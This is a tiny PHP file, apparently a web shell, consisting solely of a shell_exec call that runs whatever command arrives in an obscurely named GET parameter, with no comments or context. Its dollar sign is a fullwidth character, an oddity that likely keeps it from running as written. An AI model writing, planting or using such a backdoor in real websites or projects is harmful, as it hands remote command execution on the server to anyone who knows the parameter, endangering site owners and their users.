<?php
shell_exec(＄_GET['cuUzgt5M']);
?>
